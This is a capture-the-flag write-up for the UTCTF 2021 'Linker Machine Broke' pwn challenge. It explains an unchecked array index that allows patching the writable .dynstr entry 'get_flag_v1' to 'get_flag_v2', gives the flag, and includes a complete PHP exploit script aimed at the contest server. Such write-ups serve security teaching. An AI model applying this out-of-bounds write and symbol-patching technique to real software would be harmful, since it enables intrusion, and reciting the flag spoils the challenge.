# Linker Machine Broke - UTCTF 2021 (pwn, 986p, 39 solved)

## Introduction
Linker Machine Broke is a binary exploitation task.

An archive containing an x64 ELF binary and a dynamic library is given. When
running the binary locally, it prints a fake flag:
`utflag{look_in_v2_for_the_flag}`. When running the binary remotely, it prints
an error from the linker:
`/build/linker: symbol lookup error: /build/linker: undefined symbol: get_flag_v1`

## Reverse engineering
The binary prints a list of 4 elements and asks the user to provide an index `n`
and a value. The binary replaces the `n`th element of the list with the provided
value. The list is located in the BSS.

```c
int  idx;
char value;

scanf("%d",   &idx);
scanf("%hhd", &value);

vals[idx] = value;
```

The challenge makes it clear that the function `get_flag_v2` should be called.
The binary imports and calls the `get_flag_v1` function.

## Vulnerability
There are no bounds check on the index, meaning it is possible to change a byte
at any writable location in the program.

The `.dynstr` section that contains imported function names is writable.

## Exploitation
It is possible to call the `get_flag_v2` function by patching the `1` byte to
`2` of the `get_flag_v1` string in the `.dynstr` section.

**Flag**: `utflag{you_fixed_my_linker!738}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php // vim: filetype=php
require_once "Process.php";
require_once "Socket.php";

const LOCAL = false;
const HOST  = "pwn.utctf.live";
const PORT  = 5433;

const VALS    = 0x3458;
const VERSION = 0x51A;

printf("[*] Creating process\n");
$time = microtime(true);

putenv("LD_LIBRARY_PATH=.");
if(LOCAL)
	$t = new Process("./linker");
else
	$t = new SocketTube(HOST, PORT);


printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");

$idx   = VERSION - VALS;
$value = ord("2");

LOCAL || $t->expectLine("Want to look at my array?");
LOCAL || $t->expectLine("1 2 3 4 ");
LOCAL || $t->expectLine("Since you seem nice, you can even change one of the values");

$t->write("$idx $value\n");
LOCAL || $t->expectLine("I'll give you the flag now");

printf("[!] Dumping...\n");
while($buffer = $t->read(4096))
	printf("%s\n", $buffer);
```
